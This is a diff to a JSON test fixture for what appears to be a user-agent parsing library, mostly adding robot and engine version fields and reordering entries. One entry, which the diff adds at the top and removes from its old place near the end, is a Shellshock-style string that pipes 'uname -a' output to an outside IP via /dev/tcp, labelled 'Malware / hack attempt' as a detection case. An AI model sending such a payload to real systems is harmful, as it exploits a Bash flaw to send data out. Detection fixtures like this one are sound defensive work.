@@ -1,4 +1,15 @@
 {
+   "(){ :; }; /bin/uname -a > /dev/tcp/104.192.0.21/53" : {
+      "browser_beta" : ".0.21/53",
+      "browser_major" : "104",
+      "browser_minor" : ".192",
+      "match" : [
+         "robot",
+         "malware"
+      ],
+      "robot" : "malware",
+      "robot_name" : "Malware / hack attempt"
+   },
    "ALCATEL_A392G/1.0 ObigoInternetBrowser/Q05A[TF013513003477632000000018014935480]" : {
       "browser" : "obigo",
       "browser_string" : "Obigo",
@@ -41,6 +52,28 @@
       "os_string" : "Amiga",
       "other" : null,
       "version" : "3.3"
+   },
+   "AndroidDownloadManager/5.0 (Linux; U; Android 5.0; SM-G900P Build/LRX21T)" : {
+      "browser" : "adm",
+      "browser_major" : "5",
+      "browser_minor" : ".0",
+      "browser_string" : "Android Download Manager",
+      "device" : "android",
+      "device_string" : "Android (SM-G900P)",
+      "match" : [
+         "device",
+         "android",
+         "mobile",
+         "adm",
+         "lib"
+      ],
+      "os" : "android",
+      "os_beta" : "",
+      "os_major" : "5",
+      "os_minor" : ".0",
+      "os_string" : "Android",
+      "os_version" : "5.0",
+      "robot" : 0
    },
    "Baiduspider+(+http://www.baidu.com/search/spider.htm)" : {
       "country" : null,
@@ -107,8 +140,12 @@
       "public_minor" : ".1",
       "public_version" : "2.1",
       "robot" : "googlemobile",
+      "robot_beta" : "",
+      "robot_major" : "2",
+      "robot_minor" : ".1",
       "robot_name" : "Googlebot Mobile",
       "robot_string" : "Googlebot Mobile",
+      "robot_version" : "2.1",
       "version" : "2.1"
    },
    "ELinks/0.12~pre5-2ubuntu1 (textmode; Ubuntu; Linux 2.6.32-24-generic x86_64; 135x85-2)" : {
@@ -151,7 +188,11 @@
       "no_match" : null,
       "other" : null,
       "robot" : "getright",
+      "robot_beta" : ".1",
+      "robot_major" : "3",
+      "robot_minor" : ".2",
       "robot_string" : "GetRight",
+      "robot_version" : "3.2",
       "version" : "3.2"
    },
    "Googlebot-Image/1.0" : {
@@ -163,8 +204,12 @@
       ],
       "minor" : "0",
       "robot" : "googlebotimage",
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".0",
       "robot_name" : "Googlebot Images",
       "robot_string" : "Googlebot Images",
+      "robot_version" : "1.0",
       "version" : "1"
    },
    "Googlebot-News" : {
@@ -186,8 +231,12 @@
       ],
       "minor" : "0",
       "robot" : "googlebotvideo",
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".0",
       "robot_name" : "Googlebot Video",
       "robot_string" : "Googlebot Video",
+      "robot_version" : "1.0",
       "version" : "1"
    },
    "Googlebot/1.0 (googlebot@googlebot.com http://googlebot.com/)" : {
@@ -198,7 +247,11 @@
       ],
       "minor" : "0",
       "robot" : "google",
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".0",
       "robot_string" : "Googlebot",
+      "robot_version" : "1.0",
       "version" : "1"
    },
    "Googlebot/2.1 (+http://www.google.com/bot.html)" : {
@@ -209,8 +262,28 @@
       ],
       "minor" : "0.1",
       "robot" : "google",
+      "robot_beta" : "",
+      "robot_major" : "2",
+      "robot_minor" : ".1",
       "robot_string" : "Googlebot",
+      "robot_version" : "2.1",
       "version" : "2.1"
+   },
+   "HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.3.29" : {
+      "browser_beta" : ".1",
+      "browser_major" : "2",
+      "browser_minor" : ".2",
+      "match" : [
+         "robot",
+         "lib",
+         "phplib"
+      ],
+      "robot" : "phplib",
+      "robot_beta" : ".1",
+      "robot_major" : "2",
+      "robot_minor" : ".2",
+      "robot_name" : "PHP http library",
+      "robot_version" : "2.2"
    },
    "HUAWEI-H215G/1.0[TF860495020075686000000017029451468] Obigo-Browser/Q05A MMS/UNIBOX/V1.2 HuaweiJava/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1" : {
       "beta" : "[tf860495020075686000000017029451468]",
@@ -241,7 +314,11 @@
       "public_minor" : ".1",
       "public_version" : "3.1",
       "robot" : "java",
+      "robot_beta" : "",
+      "robot_major" : "3",
+      "robot_minor" : ".1",
       "robot_string" : "Java",
+      "robot_version" : "3.1",
       "version" : "3.1"
    },
    "Java/1.6.0_17" : {
@@ -260,7 +337,11 @@
       "public_minor" : ".6",
       "public_version" : "1.6",
       "robot" : "java",
+      "robot_beta" : ".0_17",
+      "robot_major" : "1",
+      "robot_minor" : ".6",
       "robot_string" : "Java",
+      "robot_version" : "1.6",
       "version" : "1.6"
    },
    "Konqueror/1.1.2" : {
@@ -297,8 +378,12 @@
          "linkchecker"
       ],
       "robot" : "linkchecker",
+      "robot_beta" : "",
+      "robot_major" : "7",
+      "robot_minor" : ".4",
       "robot_name" : "LinkChecker",
-      "robot_string" : "LinkChecker"
+      "robot_string" : "LinkChecker",
+      "robot_version" : "7.4"
    },
    "Links (2.1pre15; Linux 2.4.26-vc4 i586; x)" : {
       "browser" : "links",
@@ -378,7 +463,11 @@
       ],
       "minor" : "0.1",
       "robot" : "googleadsense",
+      "robot_beta" : "",
+      "robot_major" : "2",
+      "robot_minor" : ".1",
       "robot_string" : "Google AdSense",
+      "robot_version" : "2.1",
       "version" : "2.1"
    },
    "Microsoft Office Existence Discovery" : {
@@ -397,6 +486,8 @@
       ],
       "os" : null,
       "other" : null,
+      "robot" : "msoffice",
+      "robot_string" : "Microsoft Office",
       "version" : null
    },
    "Mozilla/1.1 (Windows 3.0; I)" : {
@@ -2467,6 +2558,7 @@
       "browser" : "ie",
       "browser_string" : "MSIE",
       "device" : "winphone",
+      "device_string" : "Microsoft Virtual",
       "engine" : "trident",
       "engine_beta" : "",
       "engine_major" : "7",
@@ -2655,6 +2747,7 @@
       "engine_major" : "12",
       "engine_minor" : ".10240",
       "engine_string" : "EdgeHTML",
+      "engine_version" : "12.10240",
       "match" : [
          "edge",
          "edgehtml",
@@ -2676,6 +2769,7 @@
       "engine_major" : "13",
       "engine_minor" : ".10586",
       "engine_string" : "EdgeHTML",
+      "engine_version" : "13.10586",
       "match" : [
          "edge",
          "edgehtml",
@@ -2697,6 +2791,7 @@
       "engine_major" : "12",
       "engine_minor" : ".0",
       "engine_string" : "EdgeHTML",
+      "engine_version" : "12.0",
       "match" : [
          "edge",
          "edgehtml",
@@ -2718,6 +2813,7 @@
       "engine_major" : "13",
       "engine_minor" : ".10586",
       "engine_string" : "EdgeHTML",
+      "engine_version" : "13.10586",
       "match" : [
          "edge",
          "edgehtml",
@@ -2893,6 +2989,7 @@
       "engine_major" : "12",
       "engine_minor" : ".0",
       "engine_string" : "EdgeHTML",
+      "engine_version" : "12.0",
       "match" : [
          "edge",
          "edgehtml",
@@ -2903,7 +3000,11 @@
          "winphone10"
       ],
       "os" : "winphone",
+      "os_beta" : "",
+      "os_major" : "10",
+      "os_minor" : ".0",
       "os_string" : "Windows Phone",
+      "os_version" : "10.0",
       "robot" : 0
    },
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1" : {
@@ -3980,8 +4081,12 @@
          "robot"
       ],
       "robot" : "ahrefs",
+      "robot_beta" : "",
+      "robot_major" : "5",
+      "robot_minor" : ".0",
       "robot_name" : "Ahrefs",
-      "robot_string" : "Ahrefs"
+      "robot_string" : "Ahrefs",
+      "robot_version" : "5.0"
    },
    "Mozilla/5.0 (compatible; Konqueror/3.5; Linux; X11; x86_64) KHTML/3.5.6 (like Gecko) (Kubuntu)" : {
       "browser" : "konqueror",
@@ -4040,8 +4145,12 @@
          "robot"
       ],
       "robot" : "mj12bot",
+      "robot_beta" : ".5",
+      "robot_major" : "1",
+      "robot_minor" : ".4",
       "robot_name" : "Majestic-12 DSearch",
-      "robot_string" : "Majestic-12 DSearch"
+      "robot_string" : "Majestic-12 DSearch",
+      "robot_version" : "1.4"
    },
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)" : {
       "browser" : "ie",
@@ -4272,8 +4381,12 @@
          "yahoo"
       ],
       "robot" : "slurp",
+      "robot_beta" : "",
+      "robot_major" : "3",
+      "robot_minor" : ".0",
       "robot_name" : "Yahoo! Slurp",
-      "robot_string" : "Yahoo! Slurp"
+      "robot_string" : "Yahoo! Slurp",
+      "robot_version" : "3.0"
    },
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" : {
       "match" : [
@@ -4281,8 +4394,12 @@
          "robot"
       ],
       "robot" : "yandex",
+      "robot_beta" : "",
+      "robot_major" : "3",
+      "robot_minor" : ".0",
       "robot_name" : "Yandex",
-      "robot_string" : "Yandex"
+      "robot_string" : "Yandex",
+      "robot_version" : "3.0"
    },
    "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)" : {
       "match" : [
@@ -4290,8 +4407,12 @@
          "yandeximages"
       ],
       "robot" : "yandeximages",
+      "robot_beta" : "",
+      "robot_major" : "3",
+      "robot_minor" : ".0",
       "robot_name" : "YandexImages",
-      "robot_string" : "YandexImages"
+      "robot_string" : "YandexImages",
+      "robot_version" : "3.0"
    },
    "Mozilla/5.0 (compatible; special_archiver/3.1.1 +http://www.archive.org/details/archive.org_bot)" : {
       "match" : [
@@ -4299,8 +4420,12 @@
          "specialarchiver"
       ],
       "robot" : "specialarchiver",
+      "robot_beta" : ".1",
+      "robot_major" : "3",
+      "robot_minor" : ".1",
       "robot_name" : "archive.org_bot",
-      "robot_string" : "archive.org_bot"
+      "robot_string" : "archive.org_bot",
+      "robot_version" : "3.1"
    },
    "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; en-NZ) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0" : {
       "browser" : "safari",
@@ -4489,7 +4614,11 @@
       "public_minor" : "0",
       "public_version" : "4.0",
       "robot" : "googlemobile",
-      "robot_string" : "Googlebot Mobile"
+      "robot_beta" : "",
+      "robot_major" : "2",
+      "robot_minor" : ".1",
+      "robot_string" : "Googlebot Mobile",
+      "robot_version" : "2.1"
    },
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0 like Mac OS X; ja-JP) AppleWebKit/534.12 (KHTML, like Gecko) Puffin/1.3.3507MS Mobile Safari/534.12" : {
       "browser" : "safari",
@@ -4536,6 +4665,7 @@
       "engine_major" : "534",
       "engine_minor" : ".46",
       "engine_string" : "WebKit",
+      "engine_version" : "534.46",
       "language" : "EN",
       "match" : [
          "chrome",
@@ -4550,6 +4680,7 @@
       "os_major" : "5",
       "os_minor" : ".1",
       "os_string" : "iOS",
+      "os_version" : "5.1",
       "robot" : 0
    },
    "Mozilla/5.0 (iPod; U; CPU iPhone OS 2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5F137 Safari/525.20" : {
@@ -4689,7 +4820,11 @@
       "public_minor" : "0",
       "public_version" : "1.0",
       "robot" : "unknown",
-      "robot_string" : "DnsHealthCheckBot/1.0"
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".0",
+      "robot_string" : "DnsHealthCheckBot/1.0",
+      "robot_version" : "1.0"
    },
    "Nokia-WAP-Toolkit/1.3beta" : {
       "country" : null,
@@ -5016,7 +5151,11 @@
       "public_minor" : ".1",
       "public_version" : "2.1",
       "robot" : "googlemobile",
+      "robot_beta" : "",
+      "robot_major" : "2",
+      "robot_minor" : ".1",
       "robot_string" : "Googlebot Mobile",
+      "robot_version" : "2.1",
       "version" : "2.1"
    },
    "SonyEricssonG502/R1FA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0 UCWEB/2.0 (Java; U; MIDP-2.0; id; SonyEricssonG502) U2/1.0.0 UCBrowser/9.3.0.326 U2/1.0.0 Mobile" : {
@@ -5085,7 +5224,11 @@
       "public_minor" : ".01",
       "public_version" : "4.01",
       "robot" : "msnmobile",
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".1",
       "robot_string" : "MSN Mobile",
+      "robot_version" : "1.1",
       "version" : "4.01"
    },
    "TinyBrowser/2.0 (TinyBrowser Comment) Gecko/20201231" : {
@@ -5163,7 +5306,11 @@
       "no_match" : null,
       "other" : null,
       "robot" : "wget",
+      "robot_beta" : ".5",
+      "robot_major" : "1",
+      "robot_minor" : ".4",
       "robot_string" : "wget",
+      "robot_version" : "1.4",
       "version" : "1.4"
    },
    "YourWap/1.16" : {
@@ -5188,7 +5335,11 @@
          "facebook"
       ],
       "robot" : "facebook",
-      "robot_string" : "Facebook"
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".1",
+      "robot_string" : "Facebook",
+      "robot_version" : "1.1"
    },
    "fetch/1.0 FreeBSD/4.0-CURRENT (i386)" : {
       "major" : "1",
@@ -5240,7 +5391,11 @@
       "no_match" : null,
       "other" : null,
       "robot" : "curl",
+      "robot_beta" : "",
+      "robot_major" : "1",
+      "robot_minor" : ".0",
       "robot_string" : "curl",
+      "robot_version" : "1.0",
       "version" : "1"
    },
    "libwww-perl/5.11" : {
@@ -5256,7 +5411,11 @@
       "no_match" : null,
       "other" : null,
       "robot" : "lwp",
+      "robot_beta" : "",
+      "robot_major" : "5",
+      "robot_minor" : ".11",
       "robot_string" : "LWP::UserAgent",
+      "robot_version" : "5.11",
       "version" : "5.11"
    },
    "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" : {
@@ -5274,7 +5433,11 @@
       "public_minor" : "0",
       "public_version" : "2.0",
       "robot" : "msn",
+      "robot_beta" : "b",
+      "robot_major" : "2",
+      "robot_minor" : ".0",
       "robot_string" : "MSN",
+      "robot_version" : "2.0",
       "version" : "2.0"
    },
    "puf/0.93.2a (Linux 2.4.20-19.9; i686)" : {
@@ -5298,51 +5461,12 @@
       "os_string" : "Linux",
       "other" : null,
       "robot" : "puf",
+      "robot_beta" : ".2a",
+      "robot_major" : "0",
+      "robot_minor" : ".93",
       "robot_string" : "puf",
+      "robot_version" : "0.93",
       "version" : "0.93"
-   },
-   "AndroidDownloadManager/5.0 (Linux; U; Android 5.0; SM-G900P Build/LRX21T)" : {
-      "browser" : "adm",
-      "browser_major" : "5",
-      "browser_minor" : ".0",
-      "browser_string" : "Android Download Manager",
-      "device" : "android",
-      "device_string" : "Android (SM-G900P)",
-      "match" : [
-         "device",
-         "android",
-         "mobile",
-         "adm",
-         "lib"
-      ],
-      "os" : "android",
-      "os_beta" : "",
-      "os_major" : "5",
-      "os_minor" : ".0",
-      "os_string" : "Android",
-      "robot" : 0
-   },
-   "(){ :; }; /bin/uname -a > /dev/tcp/104.192.0.21/53" : {
-      "browser_beta" : ".0.21/53",
-      "browser_major" : "104",
-      "browser_minor" : ".192",
-      "match" : [
-         "robot",
-         "malware"
-      ],
-      "robot" : "malware",
-      "robot_name" : "Malware / hack attempt"
-   },
-   "HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.3.29" : {
-      "browser_beta" : ".1",
-      "browser_major" : "2",
-      "browser_minor" : ".2",
-      "match" : [
-         "robot",
-         "lib",
-         "phplib"
-      ],
-      "robot" : "phplib",
-      "robot_name" : "PHP http library"
    }
 }
+
